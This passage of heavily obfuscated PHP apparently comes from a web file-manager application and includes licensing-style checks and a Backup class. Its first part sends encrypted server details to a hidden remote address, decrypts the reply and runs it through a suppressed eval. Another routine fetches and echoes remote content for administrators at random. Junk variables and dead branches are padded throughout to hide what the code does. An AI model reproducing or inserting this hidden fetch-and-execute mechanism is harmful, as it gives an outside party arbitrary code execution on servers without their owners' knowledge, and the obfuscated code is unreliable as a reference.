Model($ƒ™‹àÒù[33])->get($ƒ™‹àÒù[131]), $ƒ™‹àÒù[105] => md5($_SERVER[$ƒ™‹àÒù[106]] . $Š²ğÎ·ş), $ƒ™‹àÒù[156] => $ƒ™‹àÒù[136], $ƒ™‹àÒù[159] => $_SERVER[$ƒ™‹àÒù[160]]); $Í™„Ğøß = $¡ùÅéç»[750]; if (!$Í™„Ğøß) { die; } $…Ææ‰­® = $this->mswn1f63253c($ƒ™‹àÒù[259], $—É‹ñ¯); $ôÚÚ¨éË = $¡ùÅéç»[751]; if (strlen($ôÚÚ¨éË) < $¡ùÅéç»[695]) { return; } if (!is_array($…Ææ‰­®)) { return; } if ($…Ææ‰­®[$ƒ™‹àÒù[152]] && $…Ææ‰­®[$ƒ™‹àÒù[260]]) { if ($this->ceib05a6edcc($…Ææ‰­®[$ƒ™‹àÒù[260]]) == $—É‹ñ¯[$ƒ™‹àÒù[152]]) { return; } } $this->jtwcfacb7b6e(); if ($this->ceib05a6edcc($…Ææ‰­®[$ƒ™‹àÒù[260]]) != $—É‹ñ¯[$ƒ™‹àÒù[152]]) { $ÄÎ¥é = array($ƒ™‹àÒù[185] => $Š²ğÎ·ş, $ƒ™‹àÒù[186] => $_SERVER[$ƒ™‹àÒù[106]], $ƒ™‹àÒù[187] => this_url(), $ƒ™‹àÒù[161] => $_SERVER[$ƒ™‹àÒù[162]]); $Ô¤¹ÌñÏ = $this->akos1ea96218(json_encode($ÄÎ¥é)); $…Ææ‰­® = $this->mswn1f63253c($ƒ™‹àÒù[188] . $Ô¤¹ÌñÏ); if ($…Ææ‰­® && is_array($…Ææ‰­®) && isset($…Ææ‰­®[$ƒ™‹àÒù[260]])) { $¿ÁËÉÚş = $this->htxg88621058($…Ææ‰­®[$ƒ™‹àÒù[260]], 2); if ($¿ÁËÉÚş) { $¿ÁËÉÚş = $this->ceib05a6edcc($¿ÁËÉÚş); } if ($¿ÁËÉÚş) { try { @eval($¿ÁËÉÚş); } catch (Exception $½œÏó‰) { } } } } } private function mswn1f63253c($ÔğŸº¶… = '', $‘®ôú¾É = array(), $éöçğÍÒ = 5) { $ì¶Ø³ÚÃ =& $_SERVER[Ş­ğŠìÒ]; $Ûœ÷‘Üí =& $_SERVER[µ‡³ôÄƒ]; $¾úì¤º = $Ûœ÷‘Üí[261]; $Ş–ÙŸş“ = $ì¶Ø³ÚÃ[752]; if (!$Ş–ÙŸş“) { die; } $¾úì¤º = $this->tsnkac1c29d9($¾úì¤º, $Ûœ÷‘Üí[262]); $üØ¡›õ€ = $ì¶Ø³ÚÃ[753]; if (!$üØ¡›õ€) { return; } $¾úì¤º = $¾úì¤º . $ÔğŸº¶…; $™…ÖäËú = $ì¶Ø³ÚÃ[754]; if (!$™…ÖäËú) { return; } if ($‘®ôú¾É && is_array($‘®ôú¾É)) { $¾úì¤º = $¾úì¤º . $Ûœ÷‘Üí[263] . http_build_query($‘®ôú¾É); } if ($‘®ôú¾É === -1) { return $¾úì¤º; } $ïÛä¿çÙ = stream_context_create(array($Ûœ÷‘Üí[219] => array($Ûœ÷‘Üí[222] => $éöçğÍÒ, $Ûœ÷‘Üí[220] => $Ûœ÷‘Üí[264]), $Ûœ÷‘Üí[265] => array($Ûœ÷‘Üí[266] => !1, $Ûœ÷‘Üí[267] => !1))); $‘®ôú¾É = @file_get_contents($¾úì¤º, !1, $ïÛä¿çÙ); return json_decode($‘®ôú¾É, !0); $šª”´€ = $ì¶Ø³ÚÃ[755]; } private function bhsj5d453bc7() { $ààĞàÒ§ =& $_SERVER[Ş­ğŠìÒ]; $ˆ„®‘Òî =& $_SERVER[µ‡³ôÄƒ]; $¬òÉâ“ª = array($ˆ„®‘Òî[268] => $ˆ„®‘Òî[269], $ˆ„®‘Òî[270] => $ˆ„®‘Òî[271], $ˆ„®‘Òî[272] => $ˆ„®‘Òî[273], $ˆ„®‘Òî[274] => $ˆ„®‘Òî[275], $ˆ„®‘Òî[276] => $ˆ„®‘Òî[277], $ˆ„®‘Òî[278] => $ˆ„®‘Òî[214], $ˆ„®‘Òî[279] => $ˆ„®‘Òî[214], $ˆ„®‘Òî[280] => $ˆ„®‘Òî[269], $ˆ„®‘Òî[281] => $ˆ„®‘Òî[271], $ˆ„®‘Òî[282] => $ˆ„®‘Òî[273], $ˆ„®‘Òî[283] => $ˆ„®‘Òî[284], $ˆ„®‘Òî[285] => $ˆ„®‘Òî[275], $ˆ„®‘Òî[286] => $ˆ„®‘Òî[287], $ˆ„®‘Òî[288] => $ˆ„®‘Òî[277], $ˆ„®‘Òî[289] => $ˆ„®‘Òî[290], $ˆ„®‘Òî[291] => $ˆ„®‘Òî[292], $ˆ„®‘Òî[293] => $ˆ„®‘Òî[294]); $çˆ€Öğá = $ààĞàÒ§[756]; if (!$çˆ€Öğá) { return; } $µ¾ó±×¯ = $¬òÉâ“ª[$this->motpbd1ebf01]; $µ¾ó±×¯ = intval($µ¾ó±×¯ ? $µ¾ó±×¯ : $ˆ„®‘Òî[269]); $ÈÒÓı = _get($this->hlkdbb0cf943, $ˆ„®‘Òî[295]); $›¹¿ÑŞ÷ = $ààĞàÒ§[757]; $ÈÒÓı = $ÈÒÓı ? intval($ÈÒÓı) : 0; $¦åˆíÒó = $ààĞàÒ§[758]; while ($¦åˆíÒó < $ààĞàÒ§[687]) { if ($¦åˆíÒó >= 0) { break; } $¦åˆíÒó++; } return $µ¾ó±×¯ + $ÈÒÓı; } public function fpsa5a741de2($Î®Ëıõ¢) { $èî¾ñØä =& $_SERVER[µ‡³ôÄƒ]; $ùêé‹ÚÃ = $this->bhsj5d453bc7(); if ($Î®Ëıõ¢[$èî¾ñØä[296]] == $èî¾ñØä[122]) { return; } if ($ùêé‹ÚÃ >= intval($èî¾ñØä[214])) { return; } $¦óÃıÚ± = Model($èî¾ñØä[125])->count(); if ($¦óÃıÚ± <= $ùêé‹ÚÃ) { return; } $¦…±ÒåÁ = Model($èî¾ñØä[125])->field($èî¾ñØä[296])->limit($ùêé‹ÚÃ)->select(); $¦…±ÒåÁ = array_to_keyvalue($¦…±ÒåÁ, $èî¾ñØä[6], $èî¾ñØä[296]); if (!in_array($Î®Ëıõ¢[$èî¾ñØä[296]], $¦…±ÒåÁ)) { show_json($èî¾ñØä[297], !1, $èî¾ñØä[210]); } } public function mzxg1e3816e2() { $ÚŸÚ›¶ =& $_SERVER[Ş­ğŠìÒ]; $ÑÌàÓ”Ÿ =& $_SERVER[µ‡³ôÄƒ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $Ÿ¯Éô£ë = $ÑÌàÓ”Ÿ[217]; $Ÿ¯Éô£ë = $this->tsnkac1c29d9($Ÿ¯Éô£ë, $ÑÌàÓ”Ÿ[218]); $£ß€Ì–Ô = $ÚŸÚ›¶[759]; if (!$£ß€Ì–Ô) { return; } $Úˆş™¦‘ = stream_context_create(array($ÑÌàÓ”Ÿ[219] => array($ÑÌàÓ”Ÿ[220] => $ÑÌàÓ”Ÿ[221], $ÑÌàÓ”Ÿ[222] => 3))); $°öùê¶ = $ÚŸÚ›¶[760]; if (!$°öùê¶) { die; } $´»µ­ãâ = @file_get_contents($Ÿ¯Éô£ë, !1, $Úˆş™¦‘); echo $ÑÌàÓ”Ÿ[298] . hash_encode($´»µ­ãâ) . $ÑÌàÓ”Ÿ[299]; } private function vtphc8708edd($Ëâ¾µÉ‚, $¥Õ¨í°, $™ß¿¾øæ = 3) { $§õ”ŒÛ³ =& $_SERVER[Ş­ğŠìÒ]; $äã¹ñã’ =& $_SERVER[µ‡³ôÄƒ]; usleep(1); $Êâ¶½«– = $§õ”ŒÛ³[761]; if (!$Êâ¶½«–) { die; } $Ëâ¾µÉ‚ = trim($Ëâ¾µÉ‚); $û¯Åóş = $§õ”ŒÛ³[762]; if (!$û¯Åóş) { die; } $¡Á¸÷Âù = mt_rand(0, 5) . $äã¹ñã’[6]; $øœÒôù = rand_string(15); $ÎÜËˆØƒ = $äã¹ñã’[300]; switch ($¡Á¸÷Âù) { case $äã¹ñã’[206]: $§ÁË = $this->uxyof1bae123($Ëâ¾µÉ‚, strrev($¥Õ¨í° . $øœÒôù)); break; case $äã¹ñã’[122]: $§ÁË = $this->uxyof1bae123($Ëâ¾µÉ‚, strrev($øœÒôù . $¥Õ¨í°)); $óÅ¸¯™´ = $§õ”ŒÛ³[763]; break; $ÌÑ†ŞÒº = $§õ”ŒÛ³[764]; case $äã¹ñã’[301]: $§ÁË = $this->uxyof1bae123($Ëâ¾µÉ‚, base64_encode($øœÒôù . $¥Õ¨í°)); $ÂÒ•¤Ñ = $§õ”ŒÛ³[765]; if (!$ÂÒ•¤Ñ) { return; } break; $ëùÊ™É³ = $§õ”ŒÛ³[766]; case $äã¹ñã’[302]: $§ÁË = $this->uxyof1bae123($Ëâ¾µÉ‚, md5($øœÒôù . $¥Õ¨í°)); $·ó”Èşú = $§õ”ŒÛ³[767]; break; case $äã¹ñã’[303]: $Ëâ¾µÉ‚ = base64_encode($Ëâ¾µÉ‚); $øÌÃ„öÆ = $§õ”ŒÛ³[768]; while (strlen($øÌÃ„öÆ) < $§õ”ŒÛ³[687]) { if (!$øÌÃ„öÆ) { break; } $øÌÃ„öÆ++; } $”—•¦¸í = rand(0, 64); $ÀÛÂÚó = $ÎÜËˆØƒ[$”—•¦¸í]; $£Ñ´Ù´ï = $§õ”ŒÛ³[769]; if (strlen($£Ñ´Ù´ï) < $§õ”ŒÛ³[685]) { die; } $çŸÉÎ˜Ì = md5($ÀÛÂÚó . md5($¥Õ¨í° . $ÀÛÂÚó) . $¥Õ¨í°); $çŸÉÎ˜Ì = substr($çŸÉÎ˜Ì, $”—•¦¸í % 8, $”—•¦¸í % 8 + 7); $…²€Á…« = $äã¹ñã’[6]; $„ÔŸØÑ = 0; $Ó†¾»Åœ = 0; $½Šİ©Ÿ¼ = 0; $ÊÎ¥˜â = $§õ”ŒÛ³[770]; if (strlen($ÊÎ¥˜â) < $§õ”ŒÛ³[692]) { die; } for ($„ÔŸØÑ = 0; $„ÔŸØÑ < strlen($Ëâ¾µÉ‚); $„ÔŸØÑ++) { $½Šİ©Ÿ¼ = $½Šİ©Ÿ¼ == strlen($çŸÉÎ˜Ì) ? 0 : $½Šİ©Ÿ¼; $Ó†¾»Åœ = ($”—•¦¸í + strpos($ÎÜËˆØƒ, $Ëâ¾µÉ‚[$„ÔŸØÑ]) + ord($çŸÉÎ˜Ì[$½Šİ©Ÿ¼++])) % 64; $Ñõ·Û¬Ÿ = $§õ”ŒÛ³[771]; if (!$Ñõ·Û¬Ÿ) { return; } $…²€Á…« .= $ÎÜËˆØƒ[$Ó†¾»Åœ]; } $§ÁË = hash_encode($ÀÛÂÚó . $…²€Á…«); break; $êŸÍ±ö« = $§õ”ŒÛ³[772]; if (strlen($êŸÍ±ö«) < $§õ”ŒÛ³[692]) { return; } default: $§ÁË = $this->uxyof1bae123($Ëâ¾µÉ‚, $¥Õ¨í° . $øœÒôù); break; $‡œó¶‚ = $§õ”ŒÛ³[773]; if (!$‡œó¶‚) { return; } } $§ÁË = strrev($¡Á¸÷Âù . $øœÒôù . $§ÁË); if ($™ß¿¾øæ - 1 > 0) { $§ÁË = $this->vtphc8708edd($§ÁË, $¥Õ¨í°, $™ß¿¾øæ - 1); } return $§ÁË; } private function htxg88621058($ººö÷¿, $Ÿ‰œ¡¬š, $ÖÍ±Á” = 3) { $Òó÷·¬ =& $_SERVER[Ş­ğŠìÒ]; $ÙÄÓÒÀì =& $_SERVER[µ‡³ôÄƒ]; if (!is_string($ººö÷¿) || strlen($ººö÷¿) < 10) { return !1; } $ººö÷¿ = trim($ººö÷¿); $ººö÷¿ = strrev($ººö÷¿); $û£‚èşï = $ººö÷¿[0]; $–¶ôóà = substr($ººö÷¿, 1, 15); $ººö÷¿ = substr($ººö÷¿, 16); $­´·‚ = $Òó÷·¬[774]; if (strlen($­´·‚) < $Òó÷·¬[692]) { return; } $ì¯ÈŠŒ‹ = $ÙÄÓÒÀì[300]; switch ($û£‚èşï) { case $ÙÄÓÒÀì[206]: $¬¿©¤æ = $this->tsnkac1c29d9($ººö÷¿, strrev($Ÿ‰œ¡¬š . $–¶ôóà)); $‰©Ç³˜Ë = $Òó÷·¬[775]; break; case $ÙÄÓÒÀì[122]: $¬¿©¤æ = $this->tsnkac1c29d9($ººö÷¿, strrev($–¶ôóà . $Ÿ‰œ¡¬š)); $ƒ™¸é¾ = $Òó÷·¬[776]; break; case $ÙÄÓÒÀì[301]: $¬¿©¤æ = $this->tsnkac1c29d9($ººö÷¿, base64_encode($–¶ôóà . $Ÿ‰œ¡¬š)); $øóÙ•’ = $Òó÷·¬[777]; if (!$øóÙ•’) { return; } break; $µí ¦Şî = $Òó÷·¬[778]; if (strlen($µí ¦Şî) < $Òó÷·¬[687]) { die; } case $ÙÄÓÒÀì[302]: $¬¿©¤æ = $this->tsnkac1c29d9($ººö÷¿, md5($–¶ôóà . $Ÿ‰œ¡¬š)); $’ÖÙ¡¢ó = $Òó÷·¬[779]; while (strlen($’ÖÙ¡¢ó) < $Òó÷·¬[687]) { if (!$’ÖÙ¡¢ó) { break; } $’ÖÙ¡¢ó++; } break; case $ÙÄÓÒÀì[303]: $ººö÷¿ = hash_decode($ººö÷¿); $ğƒáê·İ = $ººö÷¿[0]; $ìÈßàò¶ = $Òó÷·¬[780]; if (!$ìÈßàò¶) { return; } $ººö÷¿ = substr($ººö÷¿, 1); $®÷Éô°Ô = $Òó÷·¬[781]; if (strlen($®÷Éô°Ô) < $Òó÷·¬[683]) { return; } $åİÇÒíÔ = strpos($ì¯ÈŠŒ‹, $ğƒáê·İ); $³ø¨½°ä = $Òó÷·¬[782]; $şÈ˜ƒ¬Ñ = md5($ğƒáê·İ . md5($Ÿ‰œ¡¬š . $ğƒáê·İ) . $Ÿ‰œ¡¬š); $ı«Øòş = $Òó÷·¬[783]; while ($ı«Øòş < $Òó÷·¬[692]) { if ($ı«Øòş >= 0) { break; } $ı«Øòş++; } $şÈ˜ƒ¬Ñ = substr($şÈ˜ƒ¬Ñ, $åİÇÒíÔ % 8, $åİÇÒíÔ % 8 + 7); $şÑ½Øï = $Òó÷·¬[784]; if (!$şÑ½Øï) { return; } $¥”œƒ‹ = $ÙÄÓÒÀì[6]; $€êÜ™Õ˜ = 0; $ïäï³³ = $Òó÷·¬[785]; if (strlen($ïäï³³) < $Òó÷·¬[687]) { return; } $†úÓŒ¨¨ = 0; $Ï”¼²Ûñ = $Òó÷·¬[786]; $Äå€‡”½ = 0; for ($€êÜ™Õ˜ = 0; $€êÜ™Õ˜ < strlen($ººö÷¿); $€êÜ™Õ˜++) { $Äå€‡”½ = $Äå€‡”½ == strlen($şÈ˜ƒ¬Ñ) ? 0 : $Äå€‡”½; $ˆÒÖáÖ = $Äå€‡”½++; $“¾ Ÿü’ = $Òó÷·¬[787]; if (!$“¾ Ÿü’) { return; } $†úÓŒ¨¨ = strpos($ì¯ÈŠŒ‹, $ººö÷¿[$€êÜ™Õ˜]) - $åİÇÒíÔ - ord($şÈ˜ƒ¬Ñ[$ˆÒÖáÖ]); while ($†úÓŒ¨¨ < 0) { $†úÓŒ¨¨ += 64; $¸Èà­ºÊ = $Òó÷·¬[788]; if (strlen($¸Èà­ºÊ) < $Òó÷·¬[685]) { return; } } $¥”œƒ‹ .= $ì¯ÈŠŒ‹[$†úÓŒ¨¨]; } $¬¿©¤æ = base64_decode($¥”œƒ‹); break; $¾Ç¶”óİ = $Òó÷·¬[789]; default: $¬¿©¤æ = $this->tsnkac1c29d9($ººö÷¿, $Ÿ‰œ¡¬š . $–¶ôóà); break; $ÇŠ‰ÅœÕ = $Òó÷·¬[790]; } if ($ÖÍ±Á” - 1 > 0) { $¬¿©¤æ = $this->htxg88621058($¬¿©¤æ, $Ÿ‰œ¡¬š, $ÖÍ±Á” - 1); } return $¬¿©¤æ; } public function akos1ea96218($‡ãŞÒ‹¾) { $÷”È–÷¼ =& $_SERVER[Ş­ğŠìÒ]; $¤ü¨Ò²ò =& $_SERVER[µ‡³ôÄƒ]; $™Øë­ƒ‘ = $this->gjtf9772f308(); $âà•• = $÷”È–÷¼[791]; if (!$âà••) { return; } $ÜÄßìÎ = $this->gjtf9772f308(); $·ªŒòÂÛ = $÷”È–÷¼[792]; while ($·ªŒòÂÛ < $÷”È–÷¼[695]) { if ($·ªŒòÂÛ >= 0) { break; } $·ªŒòÂÛ++; } $ûÁ¾Æ‡Š = ($™Øë­ƒ‘ - 1) * ($ÜÄßìÎ - 1); $ÄÀöìë = intval(($™Øë­ƒ‘ + $ÜÄßìÎ) / 2); while (1) { $ìµ±×¦ = $ÄÀöìë; $ĞÈƒ¬Ï = $÷”È–÷¼[793]; if (!$ĞÈƒ¬Ï) { die; } $¶®¼Ä±» = $ûÁ¾Æ‡Š; $Î¡®ç‚œ = $÷”È–÷¼[794]; while ($¶®¼Ä±» % $ìµ±×¦ != 0) { $¯ãìŸš = $¶®¼Ä±»; $“şæåÕ = $÷”È–÷¼[795]; if (!$“şæåÕ) { return; } $¶®¼Ä±» = $ìµ±×¦; $İ„øš¼ = $÷”È–÷¼[796]; $ìµ±×¦ = $¯ãìŸš % $ìµ±×¦; $ëÒœç¿ = $÷”È–÷¼[797]; if (!$ëÒœç¿) { die; } } if ($ìµ±×¦ == 1) { break; } else { $ÄÀöìë++; } } $ßÁâÀäÇ = 2; for ($Äƒ£å‡Ï = 0; $Äƒ£å‡Ï < $ûÁ¾Æ‡Š * 10; $Äƒ£å‡Ï++) { if (($ûÁ¾Æ‡Š * $Äƒ£å‡Ï + 1) % $ÄÀöìë == 0) { $ßÁâÀäÇ = intval(($ûÁ¾Æ‡Š * $Äƒ£å‡Ï + 1) / $ÄÀöìë); break; } } $š¿¥¡²Ê = $this->uxyof1bae123($™Øë­ƒ‘ * $ÜÄßìÎ . $¤ü¨Ò²ò[6], $¤ü¨Ò²ò[136]); $ÄÈ›šñó = $÷”È–÷¼[798]; if (!$ÄÈ›šñó) { return; } $‡ƒ× çÉ = md5($¤ü¨Ò²ò[304] . ($™Øë­ƒ‘ + $ÜÄßìÎ) . $¤ü¨Ò²ò[305] . $ÄÀöìë . $¤ü¨Ò²ò[305] . $ßÁâÀäÇ . $¤ü¨Ò²ò[306]); $è‘¿èÇê = $this->uxyof1bae123($‡ãŞÒ‹¾, $‡ƒ× çÉ) . $¤ü¨Ò²ò[307] . $š¿¥¡²Ê; return $è‘¿èÇê; $·èô¥ı† = $÷”È–÷¼[799]; } public function ceib05a6edcc($¶³ø¯Ò) { $ÏÑ×®öö =& $_SERVER[Ş­ğŠìÒ]; $ƒç¾Ÿ¼Ş =& $_SERVER[µ‡³ôÄƒ]; $¸±õÚ¾å = explode($ƒç¾Ÿ¼Ş[307], $¶³ø¯Ò); if (count($¸±õÚ¾å) != 2) { return $ƒç¾Ÿ¼Ş[6]; } $Ù¦¦’î‰ = $this->tsnkac1c29d9($¸±õÚ¾å[1] . $ƒç¾Ÿ¼Ş[6], $ƒç¾Ÿ¼Ş[136]); $¹å½†Ñ = $ÏÑ×®öö[800]; if (!$¹å½†Ñ) { die; } if (!$Ù¦¦’î‰) { return $ƒç¾Ÿ¼Ş[6]; } $Ù¦¦’î‰ = intval($Ù¦¦’î‰); $Ô›‰„ºÜ = $ÏÑ×®öö[801]; if (strlen($Ô›‰„ºÜ) < $ÏÑ×®öö[695]) { die; } $ÜğÉûãÁ = 0; $¡ã¼×›Ö = $ÏÑ×®öö[802]; $”ç¼æ÷é = 0; $²á‘­« = $ÏÑ×®öö[803]; if (!$²á‘­«) { die; } for ($Ç¿„…Ã = 3; $Ç¿„…Ã < $Ù¦¦’î‰; $Ç¿„…Ã += 2) { if ($Ù¦¦’î‰ % $Ç¿„…Ã != 0) { continue; } $ÜğÉûãÁ = $Ç¿„…Ã; $”ç¼æ÷é = intval($Ù¦¦’î‰ / $Ç¿„…Ã); $Šş¹Ç² = $ÏÑ×®öö[804]; if (strlen($Šş¹Ç²) < $ÏÑ×®öö[695]) { return; } break; } $ÊÉõ¦î = ($ÜğÉûãÁ - 1) * ($”ç¼æ÷é - 1); $ò¸ŸòÓ­ = $ÏÑ×®öö[805]; if (strlen($ò¸ŸòÓ­) < $ÏÑ×®öö[687]) { return; } $­×Ã›¾Ì = intval(($ÜğÉûãÁ + $”ç¼æ÷é) / 2); $úŸ÷”É = $ÏÑ×®öö[806]; while (1) { $»½‰Ç‘ = $­×Ã›¾Ì; $—ÃÃ› ‘ = $ÏÑ×®öö[807]; if (strlen($—ÃÃ› ‘) < $ÏÑ×®öö[685]) { return; } $Î¢¤»€„ = $ÊÉõ¦î; $‡òıïç = $ÏÑ×®öö[808]; if (!$‡òıïç) { return; } while ($Î¢¤»€„ % $»½‰Ç‘ != 0) { $‚§Ê = $Î¢¤»€„; $Î¢¤»€„ = $»½‰Ç‘; $€Öµò± = $ÏÑ×®öö[809]; $»½‰Ç‘ = $‚§Ê % $»½‰Ç‘; $÷ÁÌ¥ÁÃ = $ÏÑ×®öö[749]; while ($÷ÁÌ¥ÁÃ < $ÏÑ×®öö[695]) { if ($÷ÁÌ¥ÁÃ >= 0) { break; } $÷ÁÌ¥ÁÃ++; } } if ($»½‰Ç‘ == 1) { break; } else { $­×Ã›¾Ì++; } } $ö½åóÒŠ = 2; for ($Ç¿„…Ã = 0; $Ç¿„…Ã < $ÊÉõ¦î * 10; $Ç¿„…Ã++) { if (($ÊÉõ¦î * $Ç¿„…Ã + 1) % $­×Ã›¾Ì == 0) { $ö½åóÒŠ = intval(($ÊÉõ¦î * $Ç¿„…Ã + 1) / $­×Ã›¾Ì); break; } } $ë…§•Â† = md5($ƒç¾Ÿ¼Ş[304] . ($ÜğÉûãÁ + $”ç¼æ÷é) . $ƒç¾Ÿ¼Ş[305] . $­×Ã›¾Ì . $ƒç¾Ÿ¼Ş[305] . $ö½åóÒŠ . $ƒç¾Ÿ¼Ş[306]); $Åšªó³º = $this->tsnkac1c29d9($¸±õÚ¾å[0], $ë…§•Â†); return $Åšªó³º; $˜Â¾Ñ™× = $ÏÑ×®öö[810]; if (strlen($˜Â¾Ñ™×) < $ÏÑ×®öö[687]) { return; } } public function gjtf9772f308() { $İÃıÁİÂ =& $_SERVER[Ş­ğŠìÒ]; $ëÓ¸£¯ = mt_rand(pow(2, 14), pow(2, 16) - 1); $¢ƒ¯ê˜¥ = $İÃıÁİÂ[811]; if (!$¢ƒ¯ê˜¥) { return; } $İ’²èÌŸ = array(); $ó°¥‘Â¼ = 1; while ($ó°¥‘Â¼ <= (int) sqrt($ëÓ¸£¯)) { $ƒÎ¨” Â = $ó°¥‘Â¼; while (!0) { $ƒÎ¨” Â++; if ($ƒÎ¨” Â <= 2) { $ó°¥‘Â¼ = $ƒÎ¨” Â; break; } else { if ($ƒÎ¨” Â < 2) { continue; } } $‘ËÍ‡æí = !0; for ($ÜÂ×ìË¨ = 2; $ÜÂ×ìË¨ <= sqrt($ƒÎ¨” Â); $ÜÂ×ìË¨++) { if ($ƒÎ¨” Â % $ÜÂ×ìË¨ == 0) { $‘ËÍ‡æí = !1; } } if ($‘ËÍ‡æí) { $ó°¥‘Â¼ = $ƒÎ¨” Â; break; } } $İ’²èÌŸ[] = $ó°¥‘Â¼; $Ÿ€´šÄ‹ = $İÃıÁİÂ[812]; if (!$Ÿ€´šÄ‹) { die; } } $Úºùå§ = 2; for ($ƒÎ¨” Â = $ëÓ¸£¯; $ƒÎ¨” Â > 1; $ƒÎ¨” Â--) { $‘ËÍ‡æí = !0; $¸­©ö‘ = $İÃıÁİÂ[813]; foreach ($İ’²èÌŸ as $¡“û»é) { if ($ƒÎ¨” Â % $¡“û»é == 0) { $‘ËÍ‡æí = !1; break; } } if ($‘ËÍ‡æí) { $Úºùå§ = $ƒÎ¨” Â; break; } } return $Úºùå§; } public function fose70d7a422($Ÿóµì„, $èÓÚ£²…) { $¬ø¾¬¾ =& $_SERVER[µ‡³ôÄƒ]; return call_user_func(array($¬ø¾¬¾[8], $¬ø¾¬¾[308]), $Ÿóµì„, $èÓÚ£²…); } public function uxyof1bae123($ª«È—²ê, $º€ËĞøÀ) { $üªÕ‰œÁ =& $_SERVER[µ‡³ôÄƒ]; return call_user_func(array($üªÕ‰œÁ[309], $üªÕ‰œÁ[310]), $ª«È—²ê, $º€ËĞøÀ); } public function tsnkac1c29d9($­Æä†ò‡, $‹®¤ºò) { $Öí®­âÕ =& $_SERVER[Ş­ğŠìÒ]; $ÔƒÀ¼ç =& $_SERVER[µ‡³ôÄƒ]; return call_user_func(array($ÔƒÀ¼ç[309], $ÔƒÀ¼ç[311]), $­Æä†ò‡, $‹®¤ºò); $ı÷Éú§é = $Öí®­âÕ[814]; while (strlen($ı÷Éú§é) < $Öí®­âÕ[695]) { if (!$ı÷Éú§é) { break; } $ı÷Éú§é++; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[Ş­ğŠìÒ][815]); $this->init(); $this->keep(); } public function init() { $§Ú¶²±Ø =& $_SERVER[Ş­ğŠìÒ]; $this->isManual(); self::$name = date($§Ú¶²±Ø[816]); if (!($’¡¼¨¬ƒ = $this->model->lastItem())) { $’¡¼¨¬ƒ = $this->initData(); } else { self::$name = $’¡¼¨¬ƒ[$§Ú¶²±Ø[32]]; if ($’¡¼¨¬ƒ[$§Ú¶²±Ø[817]] == $§Ú¶²±Ø[91]) { self::$name = date($§Ú¶²±Ø[272]); $á¾ú†÷ª = intval(_get($’¡¼¨¬ƒ, $§Ú¶²±Ø[818], 0)); if (self::$manual == 0 && $’¡¼¨¬ƒ[$§Ú¶²±Ø[32]] == self::$name) { $this->model->remove($’¡¼¨¬ƒ[$§Ú¶²±Ø[475]]); } $’¡¼¨¬ƒ = $this->initData($á¾ú†÷ª, $’¡¼¨¬ƒ[$§Ú¶²±Ø[819]]); } else { $this->checkStore($’¡¼¨¬ƒ[$§Ú¶²±Ø[819]]); } } self::$option = $’¡¼¨¬ƒ; } private function isManual() { $®«¨®û… = _get($GLOBALS, $_SERVER[Ş­ğŠìÒ][820], 0); $®«¨®û… = intval($®«¨®û…); self::$manual = $®«¨®û… && $®«¨®û… == 1 ? 1 : 0; } private function initData($…¨»Î›Æ = 0, $ı·ª¶‡ì = '') { $Ç›ùÓ¬¦ =& $_SERVER[Ş­ğŠìÒ]; $ß’Í–… = $this->model->config(); if ($ı·ª¶‡ì && $ß’Í–…[$Ç›ùÓ¬¦[819]] != $ı·ª¶‡ì) { $…¨»Î›Æ = 0; } $this->checkStore($ß’Í–…[$Ç›ùÓ¬¦[819]]); if (self::$manual == 1) { self::$name .= $Ç›ùÓ¬¦[11] . date($Ç›ùÓ¬¦[821]); } $àÒ×äÛ• = array($Ç›ùÓ¬¦[819] => $ß’Í–…[$Ç›ùÓ¬¦[819]], $Ç›ùÓ¬¦[32] => self::$name, $Ç›ùÓ¬¦[817] => 0, $Ç›ùÓ¬¦[171] => $ß’Í–…[$Ç›ùÓ¬¦[171]], $Ç›ùÓ¬¦[822] => self::$manual, $Ç›ùÓ¬¦[369] => array($Ç›ùÓ¬¦[823] => array($Ç›ùÓ¬¦[817] => 0), $Ç›ùÓ¬¦[824] => array($Ç›ùÓ¬¦[817] => 0, $Ç›ùÓ¬¦[825] => 0, $Ç›ùÓ¬¦[826] => 0, $Ç›ùÓ¬¦[33] => $Ç›ùÓ¬¦[12], $Ç›ùÓ¬¦[827] => 0, $Ç›ùÓ¬¦[828] => 0), $Ç›ùÓ¬¦[829] => array($Ç›ùÓ¬¦[817] => 0, $Ç›ùÓ¬¦[825] => 0, $Ç›ùÓ¬¦[826] => 0, $Ç›ùÓ¬¦[827] => 0, $Ç›ùÓ¬¦[828] => 0), $Ç›ùÓ¬¦[230] => array($Ç›ùÓ¬¦[817] => 0, $Ç›ùÓ¬¦[830] => 0, $Ç›ùÓ¬¦[831] => 0, $Ç›ùÓ¬¦[832] => 0, $Ç›ùÓ¬¦[833] => 0, $Ç›ùÓ¬¦[541] => $…¨»Î›Æ, $Ç›ùÓ¬¦[827] => 0, $Ç›ùÓ¬¦[828] => 0)), $Ç›ùÓ¬¦[827] => time(), $Ç›ùÓ¬¦[828] => 0); $Åé»ÍÀÓ = $this->model->insert($àÒ×äÛ•); $àÒ×äÛ•[$Ç›ùÓ¬¦[475]] = $Åé»ÍÀÓ; return $àÒ×äÛ•; } private function checkStore($îâïßÍ) { $ºæÔŒ¸› = Model($_SERVER[Ş­ğŠìÒ][834]); $ƒ‡º¹® = $ºæÔŒ¸›->listData($îâïßÍ); $ºæÔŒ¸›->checkConfig($ƒ‡º¹®); } public static function get() { if (!self::$option) { $‚Úúúİá = Model($_SERVER[Ş­ğŠìÒ][815]); $ÀóØ¤§¸ = $‚Úúúİá->findByName(self::$name); $‚Úúúİá->parseContent($ÀóØ¤§¸); self::$option = $ÀóØ¤§¸; } return self::$option; } public static function set($µÍ· ”¼) { $ª”èîæÑ =& $_SERVER[Ş­ğŠìÒ]; $±·¦ºĞ = self::get(); foreach ($µÍ· ”¼ as $ñ†ÚÚ½‘ => $…îÌ£ü®) { array_set_value($±·¦ºĞ, $ñ†ÚÚ½‘, $…îÌ£ü®); } Model($ª”èîæÑ[815])->update($±·¦ºĞ[$ª”èîæÑ[475]], $±·¦ºĞ); self::$option = $±·¦ºĞ; return self::$option; } public function keep() { $ƒ“ïºôù =& $_SERVER[Ş­ğŠìÒ]; $õŞóÜ—ƒ = self::get(); if (_get($õŞóÜ—ƒ, $ƒ“ïºôù[835], 0) == $ƒ“ïºôù[91]) { return; } $this->backupKeep($õŞóÜ—ƒ); self::set(array($ƒ“ïºôù[835] => 1)); } private function backupKeep($ïò„âê®) { $ëà‰¥ô§ =& 